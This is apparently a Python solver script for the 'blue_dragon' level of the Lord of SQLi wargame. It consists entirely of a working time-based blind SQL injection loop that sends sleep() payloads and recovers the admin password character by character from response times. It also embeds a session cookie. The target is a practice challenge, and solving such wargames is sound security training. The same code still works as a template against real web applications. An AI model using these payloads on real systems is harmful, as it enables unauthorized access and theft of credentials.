# LordofSQLi: blue_dragon
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php'
cookies = {'PHPSESSID': 'e039r2heplar8079kk3tq79r14'}
passwd = ''

finish = False
while not finish:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"' || if(id='admin' && pw like '{passwd + c}%',sleep(2),1)#"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(f'{c}: {r.elapsed.seconds}s')
        if r.elapsed.seconds >= 2:
            passwd += c
            print('->' + passwd)
            finish = False
            break

print('->' + passwd)
